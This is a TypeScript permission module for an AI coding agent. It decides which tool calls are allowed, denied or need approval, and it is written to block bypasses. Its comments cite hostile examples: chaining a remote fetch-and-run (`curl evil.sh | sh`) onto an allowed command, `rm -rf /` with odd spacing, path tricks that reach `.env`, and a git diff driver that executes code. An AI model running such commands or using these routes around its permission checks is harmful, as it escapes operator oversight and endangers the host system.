import { isAbsolute, relative, resolve, sep } from "node:path";
import { PERMISSION_MODES } from "./types.js";
import type { PermissionMode, PermissionRequest, Rule } from "./types.js";

/**
 * Tools that only observe the workspace. These are allow-by-default outside
 * `suggest` mode so the common case does not devolve into a prompt storm.
 *
 * `git_diff` is deliberately absent: `git diff` will execute a `[diff "x"]
 * command` driver from a repository-local `.git/config`, which is reachable via
 * `.gitattributes`, and both files are agent-writable. It is treated as
 * mutating so it always takes the permission path.
 */
export const READ_ONLY_TOOLS: readonly string[] = [
  "read_file",
  "list_dir",
  "stat",
  "glob",
  "git_status",
  "git_log",
  "git_show",
];

/** Tools that change something on disk, or that can execute code. */
export const MUTATING_TOOLS: readonly string[] = ["write_file", "patch", "bash", "git_diff"];

/**
 * Tools no mode may implicitly allow.
 *
 * `bash` runs an arbitrary agent-supplied command. `git_diff` can execute a
 * repository-local `[diff "<driver>"] command` selected by `.gitattributes`, so
 * it is code execution by another route even though the argv is jaa's. Both
 * need an explicit rule or an explicit operator decision.
 */
export const NEVER_IMPLICITLY_ALLOWED: readonly string[] = ["bash", "git_diff"];

export function isReadOnlyTool(tool: string): boolean {
  return READ_ONLY_TOOLS.includes(tool);
}

const WEIGHT_TOOL = 100;
const WEIGHT_COMMAND = 60;
const WEIGHT_PATH = 40;

/**
 * Shell control operators. A command containing any of these is never matched
 * by a prefix rule.
 *
 * Without this, an allow rule for `git status` also allows
 * `git status && curl evil.sh | sh`, because the attacker picks the separator
 * and a raw string prefix knows nothing about the shell that will run it. Such
 * a command falls through to the coarser rules, which ask. Failing closed is
 * the only safe direction for a permission boundary.
 */
const SHELL_OPERATORS = ["&&", "||", ";", "|", "&", "\n", "\r", "`", "$(", ">", "<", ">>", "2>"];

export function hasShellOperator(command: string): boolean {
  return SHELL_OPERATORS.some((op) => command.includes(op));
}

/**
 * Collapse every run of whitespace to a single space and trim.
 *
 * Prefix rules are compared after this, so no combination of spaces, tabs, or
 * newlines can be used to make one command look different from itself.
 */
export function normalizeWhitespace(value: string): string {
  return value.replace(/\s+/g, " ").trim();
}

/** Every tool jaa itself registers. Anything else (e.g. an MCP tool) is unknown. */
export const KNOWN_TOOLS: readonly string[] = [
  "read_file",
  "write_file",
  "list_dir",
  "stat",
  "glob",
  "patch",
  "bash",
  "fetch_url",
  "git_status",
  "git_log",
  "git_diff",
  "git_show",
];

export function isKnownTool(tool: string): boolean {
  return KNOWN_TOOLS.includes(tool);
}

/**
 * `*` does not cross a path separator; `**` does. Matches the semantics in
 * `src/tools/fs.ts` so a permission glob and a tool glob agree.
 */
function globToRegExp(glob: string): RegExp {
  let out = "^";
  for (let i = 0; i < glob.length; i++) {
    const ch = glob[i];
    if (ch === undefined) continue;
    if (ch === "*") {
      if (glob[i + 1] === "*") {
        out += ".*";
        i++;
      } else {
        out += "[^/]*";
      }
      continue;
    }
    if (ch === "?") {
      out += "[^/]";
      continue;
    }
    out += ch.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  }
  out += "$";
  return new RegExp(out, "i");
}

/** Higher is more specific. Used to pick the winning rule. */
export function ruleSpecificity(rule: Rule): number {
  let score = 0;
  if (rule.tool !== undefined) score += WEIGHT_TOOL + rule.tool.length;
  if (rule.command !== undefined) score += WEIGHT_COMMAND + rule.command.length;
  if (rule.path !== undefined) score += WEIGHT_PATH + rule.path.length;
  return score;
}

function str(value: unknown): string | undefined {
  return typeof value === "string" && value.length > 0 ? value : undefined;
}

export function ruleMatches(rule: Rule, request: PermissionRequest): boolean {
  if (rule.tool !== undefined) {
    if (!globToRegExp(rule.tool).test(request.tool)) return false;
  }
  if (rule.command !== undefined) {
    const command = str(request.args.command);
    if (command === undefined) return false;
    // A command carrying shell operators is never claimed by a prefix rule.
    if (hasShellOperator(command)) return false;
    const prefix = normalizeWhitespace(rule.command);
    if (prefix.length === 0) return false;
    // Compare against a whitespace-normalised form of the request too, or
    // `rm  -rf /` (two spaces) slips past a `rm -rf` deny and lands on a
    // coarser allow. The shell treats those as the same command; so must we.
    const actual = normalizeWhitespace(command);
    const head = actual.slice(0, prefix.length);
    if (head.toLowerCase() !== prefix.toLowerCase()) return false;
    const next = actual.slice(prefix.length);
    if (next.length > 0 && !/^\s/.test(next)) return false;
  }
  if (rule.path !== undefined) {
    const normalized = normalizeRequestPath(request);
    if (normalized === undefined) return false;
    if (!globToRegExp(rule.path).test(normalized)) return false;
  }
  return true;
}

/**
 * Reduce a tool's `path` argument to a root-relative, slash-separated form.
 *
 * Rules must be matched against the file the tool will actually open, not the
 * string the model happened to send, otherwise `./.env`, `src/../.env`, an
 * absolute path, or a differently-cased path on Windows all slip past a
 * `deny`. This mirrors the resolution in `confinePath`.
 */
export function normalizeRequestPath(request: PermissionRequest): string | undefined {
  const raw = str(request.args.path);
  if (raw === undefined) return undefined;
  if (raw.includes("\0")) return undefined;
  try {
    const abs = isAbsolute(raw) ? resolve(raw) : resolve(request.cwd, raw);
    const root = resolve(request.root);
    const rel = relative(root, abs);
    if (rel === ".." || rel.startsWith(`..${sep}`) || isAbsolute(rel)) return undefined;
    const unix = rel.split(sep).join("/");
    // Windows and macOS filesystems are case-insensitive by default, and the
    // glob is case-insensitive too, so a case flip cannot dodge a rule.
    return process.platform === "linux" ? unix : unix.toLowerCase();
  } catch {
    return undefined;
  }
}

export function describeRule(rule: Rule): string {
  const parts: string[] = [];
  if (rule.tool !== undefined) parts.push(`tool ${rule.tool}`);
  if (rule.command !== undefined) parts.push(`command "${rule.command}"`);
  if (rule.path !== undefined) parts.push(`path ${rule.path}`);
  const scope = parts.length > 0 ? parts.join(" and ") : "all tools";
  return `${rule.decision} ${scope} (from ${rule.source})`;
}

/**
 * Baseline rules for a mode.
 *
 * Deliberately contains no allow rule for bash: shell access is never granted
 * implicitly in any mode, matching the existing `allowBash` gate.
 */
export function defaultRules(mode: PermissionMode): Rule[] {
  const rules: Rule[] = [];
  if (mode !== "suggest") {
    for (const tool of READ_ONLY_TOOLS) {
      rules.push({ decision: "allow", tool, source: "default" });
    }
  }
  for (const tool of MUTATING_TOOLS) {
    if (NEVER_IMPLICITLY_ALLOWED.includes(tool)) {
      // Deliberately emit NOTHING here. A default `ask` rule would tie on
      // specificity with the operator's own rule and win by being listed first,
      // making `permissions.allow: ["bash"]` silently ineffective while
      // `perm list` displayed it as a live allow. `resolveDecision` already
      // returns "ask" for these tools, so omitting them here fails closed
      // AND leaves an operator able to grant them explicitly.
      continue;
    }
    if (mode === "full-auto") {
      rules.push({ decision: "allow", tool, source: "default" });
    } else {
      rules.push({ decision: "ask", tool, source: "default" });
    }
  }
  return rules;
}

export function isPermissionMode(value: string): value is PermissionMode {
  return (PERMISSION_MODES as readonly string[]).includes(value);
}

/**
 * Translate a Claude Code `settings.json` into jaa rules.
 *
 * Accepts `Bash(git status:*)`, `Read(src/**)`, and bare tool names. Anything
 * unrecognised is skipped rather than guessed at, so a malformed file can never
 * silently widen access.
 */
export function importClaudeSettings(input: unknown): Rule[] {
  const rules: Rule[] = [];
  if (!input || typeof input !== "object" || Array.isArray(input)) return rules;
  const permissions = (input as Record<string, unknown>).permissions;
  if (!permissions || typeof permissions !== "object" || Array.isArray(permissions)) return rules;

  for (const [key, decision] of [
    ["allow", "allow"],
    ["deny", "deny"],
    ["ask", "ask"],
  ] as const) {
    const list = (permissions as Record<string, unknown>)[key];
    if (!Array.isArray(list)) continue;
    for (const entry of list) {
      const parsed = parseClaudeEntry(entry, decision);
      if (parsed) rules.push({ ...parsed, source: "claude" });
    }
  }
  return rules;
}

const CLAUDE_TOOL_MAP: Record<string, string> = {
  read: "read_file",
  write: "write_file",
  edit: "patch",
  glob: "glob",
  grep: "glob",
  ls: "list_dir",
  bash: "bash",
};

function parseClaudeEntry(entry: unknown, decision: Exclude<Rule["decision"], "defer">): Omit<Rule, "source"> | undefined {
  if (typeof entry !== "string") return undefined;
  const raw = entry.trim();
  if (!raw) return undefined;

  const call = /^([A-Za-z_]+)\((.*)\)$/.exec(raw);
  if (!call) {
    const mapped = CLAUDE_TOOL_MAP[raw.toLowerCase()];
    return mapped ? { decision, tool: mapped } : undefined;
  }

  const tool = CLAUDE_TOOL_MAP[(call[1] ?? "").toLowerCase()];
  if (!tool) return undefined;

  // `Bash(git status:*)` means "commands starting with git status": the `:*`
  // is a command-prefix marker, not part of the prefix.
  let arg = (call[2] ?? "").trim();
  if (arg.endsWith(":*")) arg = arg.slice(0, -2).trim();
  if (!arg) return { decision, tool };

  if (tool === "bash") return arg.includes("*") ? undefined : { decision, command: arg };
  // A path argument is already a glob (`src/**`); only a bare `*` suffix is
  // noise, and stripping it would silently narrow the rule.
  if (tool === "read_file" || tool === "write_file" || tool === "patch") {
    return { decision, path: arg.endsWith("*") && !arg.endsWith("**") ? arg.slice(0, -1) : arg };
  }
  return { decision, tool };
}
